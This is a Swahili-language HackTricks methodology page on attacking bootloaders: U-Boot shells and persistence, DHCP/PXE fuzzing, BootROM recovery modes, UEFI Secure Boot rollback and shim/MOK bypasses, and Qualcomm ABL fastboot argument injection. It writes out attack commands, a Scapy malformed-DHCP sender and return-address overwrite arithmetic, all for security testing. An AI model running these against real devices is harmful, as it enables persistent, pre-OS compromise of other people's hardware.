# Upimaji wa Bootloader

{{#include ../../banners/hacktricks-training.md}}

Hatua zifuatazo zinapendekezwa kwa kurekebisha mipangilio ya uanzishaji wa kifaa na kupima bootloader kama U-Boot na loaders za aina ya UEFI. Lenga kupata utekelezaji wa msimbo mapema, kutathmini ulinzi wa saini/rollback, na kutumia vibaya njia za recovery au network-boot.

Inahusiana: Kupita secure-boot ya MediaTek kupitia patching ya bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Njia rahisi za U-Boot na matumizi mabaya ya mazingira

1. Fikia ganda la interpreter
   - Wakati wa boot, bonyeza kitufe kinachojulikana cha kusimamisha (mara nyingi kitufe chochote, 0, space, au mfuatano maalum wa "magic" wa board) kabla `bootcmd` haijatekelezwa ili kufungua prompt ya U-Boot.<sup>[[1]](#references)</sup>

2. Kagua hali ya boot na vigezo
   - Amri zinazofaa:
     - `printenv` (onyesha mazingira)
     - `bdinfo` (taarifa za board, anwani za memory)
     - `help bootm; help booti; help bootz` (mbinu zinazotumika za kuanzisha kernel)
     - `help ext4load; help fatload; help tftpboot` (loaders zinazopatikana)

3. Rekebisha boot arguments ili kupata root shell
   - Ongeza `init=/bin/sh` ili kernel ifungue shell badala ya init ya kawaida:
     ```
     # printenv
     # setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
     # saveenv
     # boot    # or: run bootcmd
     ```

4. Netboot kutoka kwenye seva yako ya TFTP
   - Sanidi mtandao na upakue image ya kernel/fit kutoka LAN:
     ```
     # setenv ipaddr 192.168.2.2      # device IP
     # setenv serverip 192.168.2.1    # TFTP server IP
     # saveenv; reset
     # ping ${serverip}
     # tftpboot ${loadaddr} zImage           # kernel
     # tftpboot ${fdt_addr_r} devicetree.dtb # DTB
     # setenv bootargs "${bootargs} init=/bin/sh"
     # booti ${loadaddr} - ${fdt_addr_r}
     ```

5. Hifadhi mabadiliko kupitia environment
   - Ikiwa hifadhi ya env haijalindwa dhidi ya uandishi, unaweza kudumisha udhibiti:
     ```
     # setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
     # saveenv
     ```
   - Kagua vigeu kama `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` vinavyoathiri njia za fallback. Thamani zilizosanidiwa vibaya zinaweza kuruhusu kuingia kwenye shell mara kwa mara.

6. Kagua vipengele vya debug/isivyo salama
   - Tafuta: `bootdelay` > 0, `autoboot` ikiwa imezimwa, `usb start; fatload usb 0:1 ...` bila vizuizi, uwezo wa kutumia `loady`/`loads` kupitia serial, `env import` kutoka kwenye media isiyoaminika, na kernels/ramdisks zinazopakiwa bila ukaguzi wa sahihi.

7. Upimaji wa picha/uthibitishaji wa U-Boot
   - Ikiwa jukwaa linadai kuwa na secure/verified boot kwa kutumia picha za FIT, jaribu picha zisizosainiwa na zilizobadilishwa:
     ```
     # tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
     # tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
     # tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
     ```
   - Kukosekana kwa `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` au tabia ya zamani ya `verify=n` mara nyingi huruhusu kuwasha payload yoyote.
   - Usisimame kwenye matokeo rahisi ya ruhusu/kataa: utafiti wa hivi karibuni wa FIT ulionyesha kuwa njia ya uthibitishaji yenyewe inaweza kuwa sehemu ya mashambulizi ya pre-auth. Fanya majaribio hasi kwenye data ya FIT iliyohifadhiwa nje (`data-offset`, `data-position`, `data-size`), uteuzi wa signed configuration, `loadables`, na ushughulikiaji wa overlay / `extra-conf`.
   - Ikiwa una source tree inayolingana, `test/vboot/vboot_test.sh` ni njia ya haraka ya kuiga tabia ya uthibitishaji wa FIT kwenye U-Boot sandbox kabla ya kugusa hardware halisi.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux`, na script bootflows
   - Kwenye build za kisasa za U-Boot, `bootcmd` mara nyingi huwa tu wrapper inayozunguka Standard Boot. Hii inamaanisha kuwa media inayoweza kuandikwa, PXE, au SPI flash zinaweza kuwa mpaka halisi wa uaminifu hata wakati environment inayoonekana haina madhara.
   - `extlinux` bootmeth hutafuta `extlinux/extlinux.conf` chini ya `/` na `/boot`; script bootmeth hutafuta `boot.scr.uimg` kwanza, kisha `boot.scr`. Kwenye network boot, jina la script linaweza kutoka kwa `boot_script_dhcp`.
   - Amri muhimu za uchunguzi wa awali:
     ```
     # bootflow scan -l
     # bootflow list
     # bootflow select 0; bootflow info -d
     # bootmeth list
     # bootmeth order "extlinux script pxe"
     ```
   - Matukio ya matumizi mabaya ya kujaribu: media ya USB/SD inayodhibitiwa na mshambuliaji iliyo mapema zaidi kwenye `boot_targets`, `/boot/extlinux/extlinux.conf` inayoweza kuandikwa, TFTP hasidi inayotoa `boot.scr`, au utekelezaji wa script kupitia SPI kwa kutumia `script_offset_f`.
   - Ikiwa platform inategemea uthibitishaji wa FIT, hakikisha configurations zimesainiwa katika kiwango cha configuration, si kwa kila image pekee; `required-mode=all` ina nguvu zaidi kuliko kukubali ufunguo wowote mmoja unaohitajika.

### Data ya nje ya FIT ya SPL inakiliwa kabla ya uthibitishaji

Kwa upakiaji wa FIT wa SPL, saini ya configuration iliyo salama haifanyi metadata ya payload ya nje kuwa salama. U-Boot huondoa `data-position`, `data-offset`, na `data-size` kwenye properties za configuration zilizosainiwa. Katika njia za `load_simple_fit()` zilizoathirika, SPL hukokotoa offset ya chanzo na urefu wa kunakili kutoka kwenye fields hizo, kisha huita `info->read()` **kabla** ya kukagua hash ya image. Kwa hiyo, FIT iliyotengenezwa kwa makusudi kwenye media ya boot inayoweza kuandikwa inaweza kufuta RAM bila kughushi saini. Kwa kawaida, property ya `load` iliyosainiwa huweka anwani ya mwisho; kwa hiyo, kwanza tambua kama kunakili data iliyozidi urefu kunaweza kufikia stack au data nyingine ya udhibiti kutoka kwenye anwani hiyo.<sup>[[15]](#references)[[16]](#references)</sup>

Fuatilia loader halisi ya board na ramani ya memory badala ya kudhani kuwa kuna usomaji wa flash: loader ya RAM iliyoonyeshwa ilifikia `spl_ram_load_read()` na `memcpy()`. Kwenye sehemu ya mwito, rekodi `fit_offset` na anwani yoyote ya msingi ya FIT inayoongezwa na reader, urefu wa block wa loader (`spl_get_bl_len(info)`), alignment yoyote maalum ya fork, `read_offset` na `size` zinazotokana na hapo, `src_ptr` ya destination, na mahali ilipo anwani ya kurudi iliyohifadhiwa. Hakikisha kama eneo la chanzo lililomappiwa na linaloendelea linatosha kwa umbali unaohitajika wa kunakili, kama linaingiliana na destination, na kama baiti zilizo kwenye nafasi ya chanzo zinaweza kutoa pointer inayoelekeza kwenye data ya FIT inayodhibitiwa na mshambuliaji. [partial return-address overwrite technique](../../binary-exploitation/stack-overflow/ret2win/) ya jumla inatumika ikiwa pointer kamili haiwezi kutimiza masharti ya alignment ya loader.<sup>[[16]](#references)</sup>

Katika build ya majaribio ya AST2600 ya biti 32 ya watafiti, `src_ptr` ilikuwa `0x80001000` na anwani ya kurudi iliyohifadhiwa ya `memcpy` ilikuwa `0x902ffe24`. Walitumia build ya upstream iliyorekebishwa kwa uwekaji wa stack na helper za alignment za OpenBMC: reader ya RAM iliongeza msingi wa FIT wa `0x10000`, na helper hizo zilizungusha offset ya chanzo kwenda chini hadi `ARCH_DMA_MINALIGN` (baiti 64). Pointer inayofaa ya little-endian kwenye `0x902fffe4` na nakala inayoishia baiti moja kabla zilibadilisha baiti tatu za chini pekee za anwani ya kurudi iliyohifadhiwa, huku zikihifadhi baiti yake ya juu inayojulikana kuwa sifuri. Loader ya RAM ya upstream badala yake hutumia urefu wa block wa baiti moja, kwa hiyo alignment hii ya baiti 64 na workaround ya partial overwrite si mahitaji ya jumla ya SPL. Kokotoa upya anwani, urefu wa block wa loader, na ukubwa wa data ya kunakili kwa kila build. Katika hesabu ya awali hapa chini, `fit_offset` inamaanisha nyongeza ya msingi wa FIT inayofanywa na reader ya RAM, na si lazima iwe argument inayopitishwa kwa `load_simple_fit()`.<sup>[[16]](#references)</sup>

```text
distance      = saved_return_slot - destination = 0x102fee24
data-position = pointer_slot - distance - fit_offset = 0x7fff11c0
data-size     = distance + 3 = 0x102fee27
```

Marekebisho ya upstream huweka mipaka kwa `data-size` ghafi na ukubwa wa uhamishaji **uliopangiliwa kwa block** kabla ya `info->read()`. Njia ya overlay hupitisha uwezo halisi wa buffer, ilhali callers wengine hutumia `CONFIG_SYS_BOOTM_LEN`, ambayo ni kikomo cha juu tu na si uthibitisho kwamba destination ina kiasi hicho cha memory iliyo huru. Unapotathmini fork ya vendor, hakikisha ukaguzi huo upo na ulinganishe kiwango cha kunakili kinachoruhusiwa na stack halisi ya SPL ya board pamoja na maeneo yaliyohifadhiwa.<sup>[[15]](#references)[[16]](#references)</sup>

## Sehemu ya mashambulizi ya Network-boot (DHCP/PXE) na servers hasidi

9. Fuzzing ya vigezo vya PXE/DHCP
   - Ushughulikiaji wa zamani wa BOOTP/DHCP wa U-Boot umekuwa na matatizo ya usalama wa memory. Kwa mfano, CVE‑2024‑42040 inaeleza ufichuaji wa memory kupitia majibu ya DHCP yaliyoundwa maalum, ambayo yanaweza kuvuja bytes kutoka kwenye memory ya U-Boot kupitia mtandao.<sup>[[4]](#references)</sup> Jaribu njia za msimbo za DHCP/PXE kwa kutumia thamani ndefu kupita kiasi au za edge-case (jina la bootfile la option 67, vendor options, sehemu za file/servername) na angalia kama kuna hangs/leaks.
   - Kipande kidogo cha Scapy cha kusisitiza vigezo vya boot wakati wa netboot:
     ```python
     from scapy.all import *
     offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
              IP(src='192.168.2.1', dst='255.255.255.255')/
              UDP(sport=67, dport=68)/
              BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
              DHCP(options=[('message-type','offer'),
                            ('server_id','192.168.2.1'),
                            # Intentionally oversized and strange values
                            ('bootfile_name','A'*300),
                            ('vendor_class_id','B'*240),
                            'end']))
     sendp(offer, iface='eth0', loop=1, inter=0.2)
     ```
   - Pia thibitisha ikiwa sehemu za jina la faili la PXE hupitishwa kwa mantiki ya shell/loader bila kusafishwa zinapounganishwa na script za provisioning za upande wa OS.

10. Jaribio la command injection kupitia seva hasidi ya DHCP
   - Sanidi huduma hasidi ya DHCP/PXE na ujaribu kuingiza herufi katika sehemu za filename au options ili kufikia interpreters za amri katika hatua zinazofuata za boot chain. Metasploit’s DHCP auxiliary, `dnsmasq`, au script maalum za Scapy zinafaa. Hakikisha umetenga mtandao wa maabara kwanza.

## Modi za recovery za SoC ROM zinazopuuza boot ya kawaida

SoC nyingi hutoa modi ya "loader" ya BootROM inayokubali code kupitia USB/UART hata kama flash images si sahihi. Ikiwa secure-boot fuses hazijachomwa, hii inaweza kutoa utekelezaji wa code kiholela mapema sana katika mnyororo.

- NXP i.MX (Serial Download Mode)
  - Zana: `uuu` (mfgtools3) au `imx-usb-loader`.
  - Mfano: `imx-usb-loader u-boot.imx` kupakia na kuendesha U-Boot maalum kutoka RAM.
- Allwinner (FEL)
  - Zana: `sunxi-fel`.
  - Mfano: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` au `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
  - Zana: `rkdeveloptool`.
  - Mfano: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` kuweka loader na kupakia U-Boot maalum.

Tathmini ikiwa eFuses/OTP za secure-boot za kifaa zimechomwa. Ikiwa sivyo, modi za kupakua za BootROM mara nyingi hupita uthibitishaji wowote wa kiwango cha juu (U-Boot, kernel, rootfs) kwa kuendesha payload yako ya hatua ya kwanza moja kwa moja kutoka SRAM/DRAM.

## Bootloaders za UEFI/PC: ukaguzi wa haraka

11. Jaribio la ESP tampering, rollback, na uandikishaji wa funguo
   - Mount EFI System Partition (ESP) na uangalie vipengele vya loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, njia za nembo za vendor.
   - Dump hali ya Secure Boot na hifadhidata za funguo kutoka kwenye OS inapowezekana:
     ```bash
     mokutil --sb-state
     efi-readvar -v PK
     efi-readvar -v KEK
     efi-readvar -v db
     efi-readvar -v dbx
     ```
   - Ikiwa platform iko katika Setup Mode, inakubali usajili wa key bila uthibitishaji, au inasafirishwa ikiwa na Platform Key ya majaribio/chaguomsingi (darasa la PKfail), msimamizi wa ndani au mshambuliaji mwenye ufikiaji wa kimwili anaweza kusajili KEK/db yake na kufanya Secure Boot ionekane “imewezeshwa” huku ikiwasha EFI binaries zozote.<sup>[[3]](#references)</sup>
   - Jaribu kuwasha kwa kutumia vipengele vya boot vilivyotiwa sahihi lakini vilivyoshushwa toleo au vinavyojulikana kuwa na athari za kiusalama ikiwa revocations za Secure Boot (dbx) hazijasasishwa. Ikiwa platform bado inaamini shims/bootmanagers za zamani, mara nyingi unaweza kupakia kernel yako mwenyewe au `grub.cfg` kutoka ESP ili kupata persistence.
   - Kwenye Windows, hosts zilizopachikwa viraka bado zinaweza kukubali boot managers zilizosainiwa zilizo hatarishi ikiwa signer ya `Microsoft Windows Production PCA 2011` bado haipo kwenye firmware `dbx`, kama ilivyoonekana kwenye BlackX.<sup>[[13]](#references)[[14]](#references)</sup> Bypass ya mtindo wa Baton Drop inaweza kusajili MOK ya mshambuliaji; kisha shim halali inaweza kupakia EFI payload iliyosainiwa kwa key hiyo wakati wa kuwasha kunakofuata.<sup>[[12]](#references)[[13]](#references)</sup> Kuondoa uaminifu kwa signer ya zamani ya Windows baadaye hakuondoi MOK iliyosajiliwa, kwa hiyo njia inayotegemea shim inaweza kuendelea kufanya kazi ikiwa shim hiyo bado inaaminika.<sup>[[12]](#references)</sup>
   - Kabla ya kujaribu njia hii ya rollback kwenye mashine ya UEFI iliyoidhinishwa, angalia **hali halisi ya revocation ya firmware**, si historia ya masasisho ya Windows pekee.<sup>[[13]](#references)[[14]](#references)</sup> Microsoft inatoa ukaguzi huu wa PowerShell wa kusoma pekee unaohitaji ruhusa za juu kwa signer ya 2011 kwenye `dbx`:<sup>[[14]](#references)</sup>
     ```powershell
     [System.Text.Encoding]::ASCII.GetString((Get-SecureBootUEFI dbx).Bytes) -match 'Microsoft Windows Production PCA 2011'
     ```
     `False` ni kidokezo tu: thibitisha kipengele mahususi cha boot kilichosainiwa na revocations nyingine katika maabara inayoweza kurejeshwa.<sup>[[12]](#references)[[14]](#references)</sup> Sasisho la registry linalosubiri kutumika au cheti cha kusaini kilichoisha muda wake si sawa na revocation ya `dbx` iliyokamilika.<sup>[[13]](#references)[[14]](#references)</sup>

12. Majaribio ya revocation za shim / SBAT / dbx zilizopitwa na wakati
   - Shim za zamani zilizosainiwa na Microsoft na fork za vendor bado zinaweza kutumika kama njia ya bootkit ya aina ya BYOVD ikiwa revocations zimepitwa na wakati. Katika maabara iliyotengwa, weka shim iliyo katika mazingira magumu kihistoria kwenye ESP na ujaribu ku-chainload `grubx64.efi` au kernel yako mwenyewe.<sup>[[11]](#references)</sup>
   - Uchunguzi wa haraka:
     ```bash
     sbverify --list shimx64.efi
     objdump -s -j .sbat shimx64.efi | less
     efibootmgr -v
     ```
   - Ikiwa shim bado inaendeshwa licha ya kuwa kwenye orodha ya kubatilisha, firmware/OS ina masasisho ya `dbx` yaliyopitwa na wakati au inaamini loader iliyoforkiwa ambayo haikuwahi kurithi ulinzi wa SBAT wa upstream.

13. Hitilafu za uchanganuzi wa nembo ya boot (darasa la LogoFAIL)
   - Firmware kadhaa za OEM/IBV zilikuwa katika hatari ya dosari za uchanganuzi wa picha katika DXE zinazochakata nembo za boot. Ikiwa mshambuliaji anaweza kuweka picha iliyoundwa mahsusi kwenye ESP katika njia mahususi ya vendor (kwa mfano, `\EFI\<vendor>\logo\*.bmp`) na kuwasha upya kifaa, huenda akaweza kutekeleza code wakati wa hatua za mwanzo za boot, hata Secure Boot ikiwa imewashwa. Jaribu kubaini ikiwa mfumo unakubali nembo zilizotolewa na mtumiaji na ikiwa OS inaweza kuandika kwenye njia hizo.<sup>[[2]](#references)</sup>


## Mapengo ya uaminifu ya Android/Qualcomm ABL + GBL (Android 16)

Kwenye vifaa vya Android 16 vinavyotumia ABL ya Qualcomm kupakia **Generic Bootloader Library (GBL)**, thibitisha ikiwa ABL **huthibitisha uhalisi wa** programu ya UEFI inayoipakia kutoka kwenye sehemu ya `efisp`. Ikiwa ABL hukagua tu **uwepo** wa programu ya UEFI na haithibitishi sahihi zake, uwezo wa kuandika kwenye `efisp` husababisha **utekelezaji wa code isiyosainiwa kabla ya OS kuanza** wakati wa boot.<sup>[[6]](#references)[[7]](#references)</sup>

Ukaguzi wa vitendo na njia za matumizi mabaya:

- **uwezo wa kuandika kwenye efisp**: Unahitaji njia ya kuandika programu maalum ya UEFI kwenye `efisp` (root/huduma yenye marupurupu, hitilafu katika programu ya OEM, njia ya recovery/fastboot). Bila hili, pengo la upakiaji wa GBL haliwezi kufikiwa moja kwa moja.<sup>[[6]](#references)</sup>
- **uingizaji wa hoja za fastboot OEM** (hitilafu ya ABL): Baadhi ya matoleo yanakubali tokeni za ziada katika `fastboot oem set-gpu-preemption` na kuziongeza kwenye mstari wa amri wa kernel. Hili linaweza kutumiwa kulazimisha SELinux iwe permissive, na hivyo kuwezesha uandishi kwenye sehemu zilizolindwa:
  ```bash
  fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
  ```
  Ikiwa kifaa kimewekewa kiraka, amri inapaswa kukataa hoja za ziada.<sup>[[5]](#references)[[6]](#references)</sup>
- **Kufungua Bootloader kupitia bendera zinazoendelea kuhifadhiwa**: Payload ya hatua ya boot inaweza kubadilisha bendera zinazoendelea kuhifadhiwa za kufungua (kwa mfano, `is_unlocked=1`, `is_unlocked_critical=1`) ili kuiga `fastboot oem unlock` bila vizuizi vya seva/idhini ya OEM. Hali hii hubaki baada ya kuwasha upya.<sup>[[6]](#references)</sup>

Maelezo ya ulinzi/uchunguzi wa awali:

- Thibitisha kama ABL hufanya uhakiki wa sahihi kwenye payload ya GBL/UEFI kutoka `efisp`. Ikiwa sivyo, ichukulie `efisp` kama sehemu yenye hatari kubwa ya kudumisha ufikiaji.
- Fuatilia kama handlers za ABL fastboot OEM zimewekewa viraka ili **kuthibitisha idadi ya hoja** na kukataa tokeni za ziada.<sup>[[8]](#references)[[9]](#references)</sup>

## Tahadhari kuhusu maunzi

Kuwa mwangalifu unaposhughulikia SPI/NAND flash wakati wa boot ya awali (kwa mfano, kuweka pini ardhini ili kukwepa usomaji), na kila wakati rejelea datasheet ya flash. Kufupisha pini kwa muda usiofaa kunaweza kuharibu kifaa au programu ya kuandika flash.

## Vidokezo na ushauri wa ziada

- Jaribu `env export -t ${loadaddr}` na `env import -t ${loadaddr}` ili kuhamisha blob za mazingira kati ya RAM na hifadhi; baadhi ya mifumo huruhusu kuingiza env kutoka kwenye media inayoweza kutolewa bila uthibitishaji.
- Ili kupata persistence kwenye mifumo inayotumia Linux na kuwasha kupitia `extlinux.conf`, mara nyingi inatosha kurekebisha mstari wa `APPEND` (kuingiza `init=/bin/sh` au `rd.break`) kwenye partition ya boot ikiwa hakuna ukaguzi wa sahihi unaotekelezwa.
- Ikiwa lengwa linatumia masasisho ya dual-slot / A/B, kagua mbinu za anti-rollback na slot-desync katika [muhtasari wa uchanganuzi wa firmware](README.md) ili usikose mapengo ya uaminifu yanayopatikana tu kwenye updater nje ya bootloader yenyewe.
- Ikiwa userland inatoa `fw_printenv/fw_setenv`, thibitisha kuwa `/etc/fw_env.config` inalingana na hifadhi halisi ya env. Offset zilizosanidiwa vibaya zinaweza kukusababisha kusoma/kuandika eneo lisilo sahihi la MTD.

## References

- [1] [Mbinu ya kupima usalama wa firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Kugundua LogoFAIL: Hatari za kuchanganua picha wakati wa kuwasha mfumo](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Vifunguo vya jukwaa visivyoaminika vinadhoofisha Secure Boot katika mfumo wa UEFI](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [Maelezo ya CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Kufungua Xiaomi kupitia mifuatano miwili ambayo haijasafishwa](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Exploit ya Qualcomm Snapdragon 8 Elite GBL inawawezesha washambuliaji kufungua bootloader](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Muundo wa Generic Bootloader (GBL)](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Rekebisha uenezaji wa ingizo lisiloaminika hadi kwenye kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: Ongeza ukaguzi wa amri ya set-hw-fence-value](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Haifai kuwasha: Kuvunja uhakiki wa sahihi wa FIT wa U-Boot](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Notisi ya Athari VU#616257 - Bootloader za shim za UEFI zilizosainiwa na Microsoft ziko katika hatari ya kukwepa Secure Boot](https://kb.cert.org/vuls/id/616257)
- [12] [UEFI bootkit ya BlackLotus: Dhana imethibitishwa](https://www.welivesecurity.com/2023/03/01/blacklotus-uefi-bootkit-myth-confirmed/)
- [13] [BlackX: UEFI bootkit inayofanana na BlackLotus](https://securelist.com/uefi-bootkit-blackx/121539/)
- [14] [Jinsi ya kudhibiti ubatilishaji wa Windows Boot Manager kwa mabadiliko ya Secure Boot](https://support.microsoft.com/en-us/servicing/os/windows/2023/03/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023)
- [15] [Kiraka cha U-Boot: Weka kikomo cha ukubwa wa data ya nje kabla ya kuisoma](https://github.com/u-boot/u-boot/commit/8f71d7170f5c3abadee45683e35ae6d925b6d417)
- [16] [Faida zilizofichwa: Kukwepa uhakiki wa sahihi katika U-Boot SPL](https://www.binarly.io/blog/signature-verification-bypass-in-u-boot-spl)
{{#include ../../banners/hacktricks-training.md}}
